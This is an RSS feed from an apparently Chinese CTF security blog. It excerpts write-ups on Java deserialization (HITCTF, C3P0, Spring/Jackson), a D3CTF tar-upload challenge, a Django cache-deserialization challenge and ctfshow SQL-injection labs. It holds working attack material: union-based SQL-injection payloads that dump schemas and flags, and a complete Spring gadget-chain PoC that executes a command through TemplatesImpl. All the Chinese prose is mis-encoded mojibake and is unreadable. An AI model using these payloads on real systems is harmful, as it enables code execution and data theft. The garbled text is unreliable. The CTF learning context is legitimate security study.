<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/</link><description>baozongwi's blog</description><lastBuildDate>Fri, 20 Feb 2026 20:57:03 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/" rel="self" type="application/rss+xml"/><item><title>HITCTF2025 EzLoader</title><link>https://baozongwi.xyz/p/hitctf-2025-ezloader/</link><guid>https://baozongwi.xyz/p/hitctf-2025-ezloader/</guid><pubDate>Fri, 19 Dec 2025 21:00:47 +0800</pubDate><description>æ§åˆ¶å™¨å°±ä¸€ä¸ªååºåˆ—åŒ–æ¥å£
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.hitctf.util; import java.io.IOException; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; public class SecureObjectInputStream extends ObjectInputStream { static String[] blacklist = new String[]{&amp;amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;amp;#34;, &amp;amp;#34;com.fasterxml.jackson.databind.node.POJONode&amp;amp;#34;, &amp;amp;#34;javax.management.BadAttributeValueExpException&amp;amp;#34;, &amp;amp;#34;javax.swing.event.EventListenerList&amp;amp;#34;, &amp;amp;#34;java.security.SignedObject&amp;amp;#34;}; public SecureObjectInputStream(InputStream in) throws IOException { super(in); } protected Class&amp;amp;lt;?&amp;amp;gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); for(String black : blacklist) { if (name.equals(black)) { System.out.println(&amp;amp;#34;Invalid:&amp;amp;#34; + desc.getName()); throw new ClassNotFoundException(desc.getName()); } } return super.resolveClass(desc); } } è¿‡æ»¤äº†å¸¸ç”¨ååºåˆ—åŒ–ç±»ï¼Œspring ä¾èµ–ï¼Œæ‰“æœ€æ–°çš„é‚£æ¡åˆ©ç”¨é“¾ï¼Œ</description><content:encoded>æ§åˆ¶å™¨å°±ä¸€ä¸ªååºåˆ—åŒ–æ¥å£
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // // Source code recreated from a .class file by â€¦</content:encoded></item><item><title>D3CTF2025 D3jtar</title><link>https://baozongwi.xyz/p/d3ctf-2025-d3jtar/</link><guid>https://baozongwi.xyz/p/d3ctf-2025-d3jtar/</guid><pubDate>Thu, 18 Dec 2025 22:55:03 +0800</pubDate><description>è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œä¸æ¶‰åŠååºåˆ—åŒ–çš„çŸ¥è¯†ï¼Œä¸€ä¸ª Jtar çš„è§£æé—®é¢˜
1 2 3 4 5 git clone https://github.com/5i1encee/D3CTF2025-d3jtar.git wget -O jdk-8u202-linux-x64.tar.gz https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz docker build -t d3jtar_image . docker run -d -p 8080:8080 --name d3jtar d3jtar_image å¯åŠ¨å®¹å™¨ä¹‹åï¼Œè§£å‹ tar åŒ…å¼€å§‹åˆ†æï¼Œçœ‹ä¸‹æ§åˆ¶å™¨
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package d3.example.controller; import d3.example.utils.BackUp; import d3.example.utils.Upload; import java.io.File; import java.io.IOException; import java.nio.file.Paths; import java.util.Arrays; import java.util.HashSet; import java.util.Objects; import java.util.Set; import javax.servlet.http.HttpServletRequest; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.servlet.ModelAndView; @Controller public class MainController { @GetMapping({&amp;amp;#34;/view&amp;amp;#34;}) public ModelAndView view(@RequestParam String page, HttpServletRequest request) { if (page.matches(&amp;amp;#34;^[a-zA-Z0-9-]+$&amp;amp;#34;)) { String viewPath = &amp;amp;#34;/WEB-INF/views/&amp;amp;#34; + page + &amp;amp;#34;.jsp&amp;amp;#34;; String realPath = request.getServletContext().getRealPath(viewPath); File jspFile = new File(realPath); if (realPath != null &amp;amp;amp;&amp;amp;amp; jspFile.exists()) { return new ModelAndView(page); } } ModelAndView mav = new ModelAndView(&amp;amp;#34;Error&amp;amp;#34;); mav.addObject(&amp;amp;#34;message&amp;amp;#34;, &amp;amp;#34;The file don&amp;amp;#39;t exist.&amp;amp;#34;); return mav; } @PostMapping({&amp;amp;#34;/Upload&amp;amp;#34;}) @ResponseBody public String UploadController(@RequestParam MultipartFile file) { try { String uploadDir = &amp;amp;#34;webapps/ROOT/WEB-INF/views&amp;amp;#34;; Set&amp;amp;lt;String&amp;amp;gt; blackList = new HashSet(Arrays.asList(&amp;amp;#34;jsp&amp;amp;#34;, &amp;amp;#34;jspx&amp;amp;#34;, &amp;amp;#34;jspf&amp;amp;#34;, &amp;amp;#34;jspa&amp;amp;#34;, &amp;amp;#34;jsw&amp;amp;#34;, &amp;amp;#34;jsv&amp;amp;#34;, &amp;amp;#34;jtml&amp;amp;#34;, &amp;amp;#34;jhtml&amp;amp;#34;, &amp;amp;#34;sh&amp;amp;#34;, &amp;amp;#34;xml&amp;amp;#34;, &amp;amp;#34;war&amp;amp;#34;, &amp;amp;#34;jar&amp;amp;#34;)); String filePath = Upload.secureUpload(file, uploadDir, blackList); return &amp;amp;#34;Upload Success: &amp;amp;#34; + filePath; } catch (Upload.UploadException e) { return &amp;amp;#34;The file is forbidden: &amp;amp;#34; + e; } } @PostMapping({&amp;amp;#34;/BackUp&amp;amp;#34;}) @ResponseBody public String BackUpController(@RequestParam String op) { if (Objects.equals(op, &amp;amp;#34;tar&amp;amp;#34;)) { try { BackUp.tarDirectory(Paths.get(&amp;amp;#34;backup.tar&amp;amp;#34;), Paths.get(&amp;amp;#34;webapps/ROOT/WEB-INF/views&amp;amp;#34;)); return &amp;amp;#34;Success !&amp;amp;#34;; } catch (IOException var3) { return &amp;amp;#34;Failure : tar Error&amp;amp;#34;; } } else if (Objects.equals(op, &amp;amp;#34;untar&amp;amp;#34;)) { try { BackUp.untar(Paths.get(&amp;amp;#34;webapps/ROOT/WEB-INF/views&amp;amp;#34;), Paths.get(&amp;amp;#34;backup.tar&amp;amp;#34;)); return &amp;amp;#34;Success !&amp;amp;#34;; } catch (IOException var4) { return &amp;amp;#34;Failure : untar Error&amp;amp;#34;; } } else { return &amp;amp;#34;Failure : option Error&amp;amp;#34;; } } } ä¸‰ä¸ªè·¯ç”±ï¼Œview è§£æ jspï¼ŒUpload ä¸Šä¼ æ–‡ä»¶ä½†æ˜¯æœ‰é»‘åå•ï¼ŒBackUp æ‰“åŒ… tar å’Œè§£åŒ… tarï¼Œçœ‹ä¸‹å…·ä½“å®ç°</description><content:encoded>è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œä¸æ¶‰åŠååºåˆ—åŒ–çš„çŸ¥è¯†ï¼Œä¸€ä¸ª Jtar çš„è§£æé—®é¢˜
1 2 3 4 5 git clone https://github.com/5i1encee/D3CTF2025-d3jtar.git wget -O jdk-8u202-linux-x64.tar.gz â€¦</content:encoded></item><item><title>C3P0ååºåˆ—åŒ–</title><link>https://baozongwi.xyz/p/c3p0-deserialization/</link><guid>https://baozongwi.xyz/p/c3p0-deserialization/</guid><pubDate>Tue, 16 Dec 2025 00:19:47 +0800</pubDate><description>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚
å…³äº JDBC å’Œ C3P0 çš„å…³ç³»ï¼ŒJDBC å°±åƒæ˜¯ Java ä¸–ç•Œé‡Œçš„â€œäº¤é€šæ³•è§„â€ï¼Œå®ƒè§„å®šäº†ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´è¯¥æ€ä¹ˆäº¤æµã€‚ä½†æ˜¯ï¼Œå…‰æœ‰æ³•è§„è¿˜ä¸è¡Œï¼Œè¿˜å¾—æœ‰äººæ¥å…·ä½“æ‰§è¡Œå’Œç®¡ç†ã€‚C3P0 å°±æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„â€œè½¦è¾†è°ƒåº¦ä¸­å¿ƒâ€ï¼Œå®ƒå®Œå…¨éµå®ˆ JDBC è¿™å¥—æ³•è§„ï¼Œä¸“é—¨è´Ÿè´£å¸®æˆ‘ä»¬é«˜æ•ˆåœ°ç®¡ç†æ•°æ®åº“è¿æ¥ï¼Œè™½ç„¶å®ƒä¸æ˜¯ Java è‡ªå¸¦çš„ï¼Œä½†å®ƒæ˜¯åœ¨å¸® JDBC æŠŠå·¥ä½œåšå¾—æ›´å¥½ã€‚
å…³äºâ€œè¿æ¥æ± â€æ˜¯ä»€ä¹ˆï¼Œè¿æ¥æ± çš„æ¦‚å¿µå…¶å®ç‰¹åˆ«åƒå’±ä»¬éª‘çš„â€œå…±äº«å•è½¦â€ã€‚ä½ å¯ä»¥è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæ²¡æœ‰è¿æ¥æ± ï¼Œæ¯æ¬¡ä½ çš„ç¨‹åºè¦è¯»å†™æ•°æ®åº“ï¼Œéƒ½å¾—ç°åœºâ€œé€ â€ä¸€è¾†è‡ªè¡Œè½¦ï¼ˆå»ºç«‹è¿æ¥ï¼‰ï¼Œéª‘å®Œäº†ä¸€æ¬¡è¿˜å¾—é©¬ä¸ŠæŠŠå®ƒâ€œæ‹†â€äº†ï¼ˆé”€æ¯è¿æ¥ï¼‰ã€‚è¿™ä¸€é€ ä¸€æ‹†ï¼Œæ—¢è´¹æ—¶é—´åˆè´¹åŠ›æ°”ï¼Œæ•ˆç‡ç‰¹åˆ«ä½ã€‚
ä¸ºä»€ä¹ˆè¦ç”¨å®ƒï¼Œæœ‰äº† C3P0 è¿™ç§è¿æ¥æ± ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†ã€‚å®ƒä¼šæå‰é€ å¥½å‡ åè¾†è½¦åœåœ¨è·¯è¾¹ï¼ˆæ± å­é‡Œï¼‰ã€‚å½“ç¨‹åºéœ€è¦æ“ä½œæ•°æ®åº“æ—¶ï¼Œç›´æ¥ä»æ± å­é‡Œâ€œé¢†â€ä¸€è¾†è½¦éª‘èµ°å°±è¡Œï¼›ç­‰äº‹æƒ…åŠå®Œäº†ï¼Œå†æŠŠè½¦è¿˜å›æ± å­é‡Œï¼Œç•™ç€ç»™ä¸‹ä¸€æ¬¡æˆ–è€…åˆ«äººç”¨ã€‚è¿™æ ·åå¤åˆ©ç”¨ï¼Œçœå»äº†é¢‘ç¹åˆ›å»ºå’Œé”€æ¯è¿æ¥çš„å¼€é”€ï¼Œç³»ç»Ÿçš„ååº”é€Ÿåº¦è‡ªç„¶å°±å˜å¿«äº†ã€‚
é‚£ä¹ˆï¼Œå¦‚æœé‚£å‡ åè¾†â€œå…±äº«å•è½¦â€ï¼ˆè¿æ¥ï¼‰éƒ½è¢«éª‘èµ°äº†ï¼Œè¿™æ—¶å€™åˆæ¥äº†æ–°çš„ç”¨æˆ·æƒ³è¦ç”¨è½¦ï¼Œä½ è§‰å¾— C3P0 ä¼šæ€ä¹ˆå¤„ç†è¿™äº›æ–°æ¥çš„è¯·æ±‚å‘¢ï¼Ÿ
æƒ³è±¡ä¸€ä¸‹ï¼Œè·¯è¾¹çš„ç«™ç‚¹åªæœ‰ 10 è¾†è½¦ï¼Œç»“æœå…¨éƒ½è¢«äººéª‘èµ°äº†ï¼ˆè¿æ¥æ± ç©ºäº†ï¼‰ã€‚è¿™ä¸ªæ—¶å€™ä¼šæ€ä¹ˆåšï¼Ÿ
å½“æ‰€æœ‰è¿æ¥éƒ½åœ¨å¿™çš„æ—¶å€™ï¼Œæ–°æ¥çš„è¯·æ±‚ä¸ä¼šé©¬ä¸Šè¢«æ‹’ç»ï¼Œè€Œæ˜¯ä¼šæ’é˜Ÿç­‰å¾…ï¼ˆé˜»å¡ï¼‰ï¼Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œä¸€æ—¦æœ‰åˆ«çš„çº¿ç¨‹ç”¨å®ŒæŠŠè¿æ¥â€œè¿˜â€å›æ¥ï¼ŒC3P0 å°±ä¼šç«‹é©¬æŠŠè¿™ä¸ªè¿æ¥åˆ†é…ç»™æ­£åœ¨æ’é˜Ÿçš„äººï¼Œä½†æ˜¯è¿™ä¸ªé˜»å¡æ˜¯æœ‰åº•çº¿çš„ã€‚
åœ¨ C3P0 ä¸­ï¼Œè¿™ä¸ªâ€œåº•çº¿â€æœ‰ä¸€ä¸ªä¸“é—¨çš„æœ¯è¯­ï¼Œå«åš Checkout Timeoutï¼Œå¹¶æŠ›å‡ºå¼‚å¸¸ğŸ¥¸
å¯¹äº C3P0 å°±äº†è§£åˆ°è¿™é‡Œï¼Œå…·ä½“å‚è§ æºç è¯¦è§£ç³»åˆ—(äº”) &amp;amp;mdash;&amp;amp;mdash; C3P0çš„ä½¿ç”¨å’Œåˆ†æï¼ˆåŒ…æ‹¬JNDIï¼‰ å·²åœæ›´ - å­æœˆç”Ÿ - åšå®¢å›­
ä½¿ç”¨ jdk8u66 ä¾èµ–å¦‚ä¸‹
1 2 3 4 5 &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.mchange&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;c3p0&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;0.9.5.2&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; C3P0å¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰å¦‚ä¸‹ä¸‰ç§
URLClassLoaderè¿œç¨‹ç±»åŠ è½½ JNDIæ³¨å…¥ åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡» URLClassLoaderè¿œç¨‹ç±»åŠ è½½ æˆ‘ä»¬çŸ¥é“æœ‰è¿™ç§åŠ è½½æ–¹å¼</description><content:encoded>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚
å…³äº JDBC å’Œ C3P0 çš„å…³ç³»ï¼ŒJDBC å°±åƒæ˜¯ Java ä¸–ç•Œé‡Œçš„â€œäº¤é€šæ³•è§„â€ï¼Œå®ƒè§„å®šäº†ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´è¯¥æ€ä¹ˆäº¤æµã€‚ä½†æ˜¯ï¼Œå…‰æœ‰æ³•è§„è¿˜ä¸è¡Œï¼Œè¿˜å¾—æœ‰äººæ¥å…·ä½“æ‰§è¡Œå’Œç®¡ â€¦</content:encoded></item><item><title>Ctfshow Sqli Labs</title><link>https://baozongwi.xyz/p/ctfshow-sqli-labs/</link><guid>https://baozongwi.xyz/p/ctfshow-sqli-labs/</guid><pubDate>Tue, 16 Dec 2025 00:16:23 +0800</pubDate><description>çº¯çº¯ç»ƒæ‰‹ï¼Œæ„Ÿè§‰è‡ªå·±æœ‰ç‚¹å¼±æ™ºäº†ğŸ¤¡
web517 1 2 3 4 5 6 7 8 9 10 11 12 ?id=1&amp;amp;#39;union select 1,2,3-- - ?id=-1&amp;amp;#39;union select 1,(select group_concat(schema_name)from information_schema.schemata),3-- - # ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test # flag,FLAG_TABLE,news,users,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS # id,flag,FLAG_COLUMN,id,title,content,time ?id=-1&amp;amp;#39;union select 1,(select group_concat(column_name)from information_schema.columns),3-- - ?id=-1&amp;amp;#39;union select 1,(select group_concat(flag)from ctfshow.flag),3-- - web518 1 2 3 4 5 6 7 ?id=-1 union select 1,2,3 ?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns),3 # flagaa,FLAG_TABLE,news,users # id,flagac,FLAG_COLUMN ?id=-1 union select 1,(select group_concat(flagac)from ctfshow.flagaa),3 web519 1 2 3 4 5 6 7 ?id=-1&amp;amp;#39;) union select 1,2,3-- - ?id=-1&amp;amp;#39;) union select 1,(select group_concat(column_name)from information_schema.columns),3-- - # id,flagaca,FLAG_COLUMN,i # flagaanec,FLAG_TABLE,news,users ?id=-1&amp;amp;#39;) union select 1,(select group_concat(flagaca)from ctfshow.flagaanec),3-- - web520 1 2 3 4 5 6 7 ?id=-1&amp;amp;#34;) union select 1,2,3-- - ?id=-1&amp;amp;#34;) union select 1,(select group_concat(column_name)from information_schema.columns),3-- - # id,flag23,FLAG_COLUMN,id,title # flagsf,FLAG_TABLE,news,users,ALL_PLUGINS ?id=-1&amp;amp;#34;) union select 1,(select group_concat(flag23)from ctfshow.flagsf),3-- - web521 1 2 3 4 5 ?id=1&amp;amp;#39; and 0-- - # æ— å›æ˜¾ ?id=1&amp;amp;#39; and 1-- - # å›æ˜¾You are in........... å¸ƒå°”ç›²æ³¨å†™å‡ºè„šæœ¬å¦‚ä¸‹</description><content:encoded>çº¯çº¯ç»ƒæ‰‹ï¼Œæ„Ÿè§‰è‡ªå·±æœ‰ç‚¹å¼±æ™ºäº†ğŸ¤¡
web517 1 2 3 4 5 6 7 8 9 10 11 12 ?id=1&amp;amp;amp;#39;union select 1,2,3-- - ?id=-1&amp;amp;amp;#39;union select 1,(select group_concat(schema_name)from â€¦</content:encoded></item><item><title>PCB2025</title><link>https://baozongwi.xyz/p/pcb-2025/</link><guid>https://baozongwi.xyz/p/pcb-2025/</guid><pubDate>Sat, 13 Dec 2025 19:01:26 +0800</pubDate><description>pcb5-ezDjango é¢˜ç›®çš„ç¼“å­˜é…ç½®ä½¿ç”¨ django.core.cache.backends.filebased.FileBasedCacheï¼Œç›®å½•æ¥è‡ªç¯å¢ƒå˜é‡ CACHE_PATHï¼ˆç¼ºçœ /tmp/django_cacheï¼‰ï¼Œç¼“å­˜é”®ç¼ºçœä¸º pwnï¼ˆapp/app/settings.py:97ï¼‰ï¼Œå¯ä»¥æ‰“Django ç¼“å­˜ååºåˆ—åŒ–
1 2 3 4 5 6 7 8 # app/app/settings.py CACHES = { &amp;amp;#39;default&amp;amp;#39;: { &amp;amp;#39;BACKEND&amp;amp;#39;: &amp;amp;#39;django.core.cache.backends.filebased.FileBasedCache&amp;amp;#39;, &amp;amp;#39;LOCATION&amp;amp;#39;: os.environ.get(&amp;amp;#39;CACHE_PATH&amp;amp;#39;, &amp;amp;#39;/tmp/django_cache&amp;amp;#39;), } } CACHE_KEY = os.environ.get(&amp;amp;#39;CACHE_KEY&amp;amp;#39;, &amp;amp;#39;pwn&amp;amp;#39;) é¢˜ç›®æä¾›äº†â€œä¸Šä¼ â†’å¤åˆ¶åˆ°ç¼“å­˜â†’è§¦å‘è¯»å–â†’æŸ¥çœ‹åŸå§‹å­—èŠ‚â€çš„å®Œæ•´é“¾è·¯ï¼šä¸Šä¼ æ¥å£æŠŠæ–‡ä»¶å†™åˆ° /tmpï¼Œå¤åˆ¶æ¥å£æŠŠè¯¥æ–‡ä»¶å†™å…¥ç¼“å­˜ç›®å½•ä¸­æŒ‡å®šæ–‡ä»¶ï¼Œè§¦å‘æ¥å£è°ƒç”¨ cache.get(key) è¯»å–å€¼å¹¶è¿”å›ï¼ˆå­—èŠ‚å€¼ä»¥ Base64 ç¼–ç ï¼‰ï¼ŒæŸ¥çœ‹å™¨ä»…ç”¨äºè°ƒè¯•åŸå§‹åå…­è¿›åˆ¶ã€‚æ ¸å¿ƒè§†å›¾ç‰‡æ®µå¦‚ä¸‹ã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # app/cacheapp/views.py @csrf_exempt def upload_payload(request): if request.method == &amp;amp;#34;POST&amp;amp;#34;: f = request.FILES.get(&amp;amp;#34;file&amp;amp;#34;, None) if not f: return json_error(&amp;amp;#39;No file uploaded&amp;amp;#39;) filename = request.POST.get(&amp;amp;#39;filename&amp;amp;#39;, f.name) if not filename.endswith(&amp;amp;#39;.cache&amp;amp;#39;): return json_error(&amp;amp;#39;Only .cache files are allowed&amp;amp;#39;) temp_dir = &amp;amp;#39;/tmp&amp;amp;#39; filepath = os.path.join(temp_dir, filename) write_file_chunks(f, filepath) return json_success(&amp;amp;#39;File uploaded&amp;amp;#39;, filepath=filepath) @csrf_exempt def copy_file(request): if request.method == &amp;amp;#34;POST&amp;amp;#34;: src = request.POST.get(&amp;amp;#39;src&amp;amp;#39;, &amp;amp;#39;&amp;amp;#39;) dst = request.POST.get(&amp;amp;#39;dst&amp;amp;#39;, &amp;amp;#39;&amp;amp;#39;) if not src or not dst: return json_error(&amp;amp;#39;Source and destination required&amp;amp;#39;) if not os.path.exists(src): return json_error(&amp;amp;#39;Source file not found&amp;amp;#39;) os.makedirs(os.path.dirname(dst), exist_ok=True) content = read_file_bytes(src) with open(dst, &amp;amp;#39;wb&amp;amp;#39;) as dest_file: dest_file.write(content) return json_success(&amp;amp;#39;File copied&amp;amp;#39;, src=src, dst=dst) @csrf_exempt def cache_trigger(request): if request.method == &amp;amp;#34;POST&amp;amp;#34;: key = request.POST.get(&amp;amp;#39;key&amp;amp;#39;, &amp;amp;#39;&amp;amp;#39;) or settings.CACHE_KEY val = cache.get(key, None) if isinstance(val, (bytes, bytearray)): return json_success(&amp;amp;#39;Triggered&amp;amp;#39;, value_b64=base64.b64encode(val).decode()) return json_success(&amp;amp;#39;Triggered&amp;amp;#39;, value=str(val)) å†suid ææƒå³å¯ï¼Œæœ€ç»ˆ Exp å¦‚ä¸‹</description><content:encoded>pcb5-ezDjango é¢˜ç›®çš„ç¼“å­˜é…ç½®ä½¿ç”¨ django.core.cache.backends.filebased.FileBasedCacheï¼Œç›®å½•æ¥è‡ªç¯å¢ƒå˜é‡ CACHE_PATHï¼ˆç¼ºçœ /tmp/django_cacheï¼‰ï¼Œ â€¦</content:encoded></item><item><title>Spring åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨é“¾</title><link>https://baozongwi.xyz/p/spring-native-deserialization-chains/</link><guid>https://baozongwi.xyz/p/spring-native-deserialization-chains/</guid><pubDate>Wed, 10 Dec 2025 22:50:56 +0800</pubDate><description>ä½ç‰ˆæœ¬çš„æˆ‘ä¹Ÿä¸æ‡‚ï¼Œæˆ‘åªçŸ¥é“é«˜ç‰ˆæœ¬çš„ã€‚
é«˜ç‰ˆæœ¬ BadAttributeValueExpException ä¸èƒ½è§¦å‘ toString äº†ï¼Œå¯»æ‰¾ä¸€ä¸ªæ›¿æ¢çš„ç±»ï¼Œä¹‹å‰å­¦åˆ°è¿‡åœ¨EventListenerList#readObjectä¸­æœ‰ä¸€ä¸ª add æ–¹æ³•ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶ç›‘å¬ç±»ï¼Œå¯ä»¥è§¦å‘ toString æ–¹æ³•
åé¢å°±æ˜¯ Jackson é“¾ï¼ŒåŠ ä¸Šé«˜ç‰ˆæœ¬ jdk åå°„ï¼ŒTemplatesImpl éœ€è¦ä½¿ç”¨ jdk åŠ¨æ€ä»£ç†ã€‚
1 --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED poc å¦‚ä¸‹
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 package org.example; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Vector; public class SpringPoc { public static void main(String[] args) throws Exception { patchModule(SpringPoc.class); ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.makeClass(&amp;amp;#34;Evil&amp;amp;#34; + System.nanoTime()); evilClass.makeClassInitializer().insertAfter(&amp;amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;amp;#34;open -a Calculator\&amp;amp;#34;);&amp;amp;#34;); byte[] evilBytes = evilClass.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); CtClass stubClass = pool.makeClass(&amp;amp;#34;Stub&amp;amp;#34; + System.nanoTime()); byte[] stubBytes = stubClass.toBytecode(); setFieldValue(templates, &amp;amp;#34;_bytecodes&amp;amp;#34;, new byte[][]{evilBytes, stubBytes}); setFieldValue(templates, &amp;amp;#34;_name&amp;amp;#34;, &amp;amp;#34;Pwnd&amp;amp;#34;); setFieldValue(templates, &amp;amp;#34;_transletIndex&amp;amp;#34;, 0); CtClass nodeClass = pool.get(&amp;amp;#34;com.fasterxml.jackson.databind.node.BaseJsonNode&amp;amp;#34;); CtMethod writeReplace = nodeClass.getDeclaredMethod(&amp;amp;#34;writeReplace&amp;amp;#34;); nodeClass.removeMethod(writeReplace); nodeClass.toClass(); Object proxyTemplates = getPOJONodeStableProxy(templates); POJONode jsonNode = new POJONode(proxyTemplates); EventListenerList listenerList = new EventListenerList(); UndoManager undoManager = new UndoManager(); Field editsField = getField(undoManager.getClass(), &amp;amp;#34;edits&amp;amp;#34;); editsField.setAccessible(true); Vector edits = (Vector) editsField.get(undoManager); edits.add(jsonNode); setFieldValue(listenerList, &amp;amp;#34;listenerList&amp;amp;#34;, new Object[]{Class.class, undoManager}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(listenerList); oos.close(); ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } private static void patchModule(Class&amp;amp;lt;?&amp;amp;gt; clazz) { try { Unsafe unsafe = getUnsafe(); Module javaBaseModule = Object.class.getModule(); long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(&amp;amp;#34;module&amp;amp;#34;)); unsafe.putObject(clazz, offset, javaBaseModule); } catch (Exception e) { e.printStackTrace(); } } private static Unsafe getUnsafe() throws Exception { Field f = Unsafe.class.getDeclaredField(&amp;amp;#34;theUnsafe&amp;amp;#34;); f.setAccessible(true); return (Unsafe) f.get(null); } private static Field getField(Class&amp;amp;lt;?&amp;amp;gt; clazz, String fieldName) { Field field = null; while (clazz != null) { try { field = clazz.getDeclaredField(fieldName); break; } catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); } } return field; } private static void setFieldValue(Object obj, String field, Object val) throws Exception { Field dField = obj.getClass().getDeclaredField(field); dField.setAccessible(true); dField.set(obj, val); } private static Object getPOJONodeStableProxy(Object templatesImpl) throws Exception { Class&amp;amp;lt;?&amp;amp;gt; clazz = Class.forName(&amp;amp;#34;org.springframework.aop.framework.JdkDynamicAopProxy&amp;amp;#34;); Constructor&amp;amp;lt;?&amp;amp;gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templatesImpl); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance( clazz.getClassLoader(), new Class[]{Templates.class, Serializable.class}, handler ); return proxyObj; } }</description><content:encoded>ä½ç‰ˆæœ¬çš„æˆ‘ä¹Ÿä¸æ‡‚ï¼Œæˆ‘åªçŸ¥é“é«˜ç‰ˆæœ¬çš„ã€‚
